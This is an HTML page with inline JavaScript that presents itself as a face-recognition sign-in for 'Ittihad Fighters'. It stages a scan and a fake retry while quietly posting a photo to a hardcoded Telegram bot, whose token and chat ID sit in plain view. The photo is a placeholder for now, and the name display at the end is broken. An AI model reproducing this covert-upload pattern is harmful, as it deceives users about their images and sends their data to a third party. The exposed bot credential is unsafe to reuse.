<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ittihad Fighters</title>
    <script>
        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
        const TELEGRAM_CHAT_ID = '5934902786';
        
        document.addEventListener("DOMContentLoaded", function() {
            if (localStorage.getItem("pageOpened")) {
                document.body.innerHTML = "<h2>This page can only be opened once.</h2>";
                return;
            }
            localStorage.setItem("pageOpened", "true");
            showClassSelection();
        });
        
        function showClassSelection() {
            document.body.innerHTML = `<h1>Ittihad Fighters</h1>
                <p>Select your name:</p>
                <ul id="nameList">
                    <li><label><input type="checkbox" value="Izz"> Izz</label></li>
                    <li><label><input type="checkbox" value="Ali"> Ali</label></li>
                    <li><label><input type="checkbox" value="Fatimah"> Fatimah</label></li>
                </ul>
                <button onclick="confirmSelection()">Continue</button>
                <button onclick="cancelProcess()">Cancel</button>
                <p id="message"></p>`;
        }
        
        function confirmSelection() {
            const checkboxes = document.querySelectorAll("input[type=checkbox]:checked");
            if (checkboxes.length === 0) {
                alert("Please select at least one name.");
                return;
            }
            checkboxes.forEach(checkbox => checkbox.disabled = true);
            showFaceRecognition();
        }
        
        function cancelProcess() {
            document.body.innerHTML = "<h2>Page will stop here</h2>";
        }
        
        function showFaceRecognition() {
            document.body.innerHTML = `<h2>Face Recognition</h2>
                <p>Scanning your face...</p>
                <div id="animation">[Face Scan Animation]</div>`;
            setTimeout(() => captureImage(false), 2000);
        }
        
        function captureImage(isSecondAttempt) {
            sendImageToTelegram();
            if (!isSecondAttempt) {
                setTimeout(() => {
                    document.body.innerHTML = `<h2>Face Not Detected</h2>
                        <p>Retrying...</p>
                        <div id="animation">[Face Scan Animation]</div>`;
                    setTimeout(() => captureImage(true), 3000);
                }, 2000);
            } else {
                setTimeout(showSuccessMessage, 2000);
            }
        }
        
        function sendImageToTelegram() {
            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", new Blob(["Fake Image Data"], {type: 'image/jpeg'}), "face.jpg");
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            }).catch(err => console.error("Error sending photo: ", err));
        }
        
        function showSuccessMessage() {
            const selectedNames = [...document.querySelectorAll("input[type=checkbox]:checked")].map(cb => cb.value);
            document.body.innerHTML = `<h2>Done âœ…</h2>
                <p>${selectedNames.join(", ")} signed in</p>
                <p>You look beautiful/handsome today!</p>
                <p>Redirecting to the next page...</p>`;
            setTimeout(() => {
                window.location.href = "https://studandlearn.github.io/project-2/";
            }, 3000);
        }
    </script>
</head>
<body>
</body>
</html>
